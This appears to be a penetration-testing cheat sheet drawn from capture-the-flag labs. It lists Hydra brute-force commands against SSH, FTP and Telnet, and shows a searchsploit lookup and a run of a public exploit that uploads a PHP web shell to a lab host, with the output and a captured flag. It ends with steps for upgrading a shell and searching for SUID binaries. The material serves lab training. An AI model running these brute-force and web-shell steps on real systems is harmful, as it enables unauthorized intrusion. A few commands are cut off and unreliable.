

################## FTP ##########################

$ ftp -p <host> <port>      //-p is for passive mode
      Then type "cd" to get list of commnads available
$ get {{file}}              //to copy the file remotely to local host



################  Hydra ###############################

-l: input login
-L: list of username
-p: single password
-P: list of passwords

//SSH
#hydra <Target_IP> ssh -l <username> -P <password_file> -s 22 -vV
#hydra <Target_IP> ssh -l <username> -p <password> -s 22 -vV

//FTP
#hydra -L <username_file> -P <password_file> ftp://<Target_IP>
#hydra -l <username> -p <password> ftp://<Target_IP>
$sudo hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.26.169 ftp -s 10021
      hydra -L {{users}} -P {{passwords}} {{IP}} {{ftp}} -s {{port}}

//TELNET
#hydra -l <username> -p <password> telnet://<Target_IP>


############## DB vulnerabilities #######################

https://www.rapid7.com/db/
https://www.exploit-db.com/
Searchploit

########### FIND A VULNERABILITY MANUALLY #################

1. Use DB such as rapid, exploid or searchploit to look manually for the vulnerability,
      after got the service running 
2. $searchsploit online book store 1.0
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
Online Book Store 1.0 - 'bookisbn' SQL Injection                   | php/webapps/47922.txt
Online Book Store 1.0 - 'id' SQL Injection                         | php/webapps/48775.txt
Online Book Store 1.0 - Arbitrary File Upload                      | php/webapps/47928.txt
Online Book Store 1.0 - Unauthenticated Remote Code Execution      | php/webapps/47887.py
Online Event Booking and Reservation System 1.0 - 'reason' Stored  | php/webapps/50450.txt
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

3. $searchsploit -m 47887               //Using this option will copy the exploitâ€™s information to our current directory.
You can copy exploit's information with -m flag
  Exploit: Online Book Store 1.0 - Unauthenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47887
     Path: /opt/exploitdb/exploits/php/webapps/47887.py
File Type: ASCII text

Copied to: /home/kaheri/Documents/47887.py

4. $cat /home/kaheri/Documents/47887.py //to examine the whole program

5. $python3 47887.py http://10.10.250.145
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.250.145/bootstrap/img/cVTShkBZpm.php
> Example command usage: http://10.10.250.145/bootstrap/img/cVTShkBZpm.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ ls

6. less flag.txt
THM{ACKME_ENGAGEMENT}
   
 ################# gobuster ######################
 
dir Mode
gobuster dir -e -u https://example.com -w ~/wordlists/shortlist.txt

################# UPGRADE LINUX REVERSE SHELL TO A FULLY USABLE TTY SHELL ##################

$ which python      //to check if python is installed and what version
$ python -c 'import pty;pty.spawn("/bin/bash")'
                  
// Here we press Cntrl + z
                  
$ echo $TERM      // We need some information about the terminal
  xterm-256color
$ stty -a         // Make a note of the number of rows and columns
$ stty raw -echo  
$ fg              //ype fg to foreground our shell running in the background,You won't be able 
                  to see those letters on the screen as you type, but hit Enter afterward, the nc will appear
                  automatically
$ reset
$ xterm-256color  // If not working, type xterm


If you can't clear the screen or use the up arrow to view history at this point, use the following commands to set the terminal type and shell once more.

www-data@metasploitable:/var/www/dvwa/vulnerabilities/exec$ export TERM=xterm
www-data@metasploitable:/var/www/dvwa/vulnerabilities/exec$ export SHELL=ba


######################### Binary Files with SUID Permission ###################################

while searching for suid files, we got a good list, and python is a one of them,

$ find / -perm /4000 2>/dev/  
//Then search in https://gtfobins.github.io/ 

################################### UPGRADE SHELL #########################
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
CTRL+Z
stty -echo raw
fg
stty rows 41 columns 166
####################################################################################


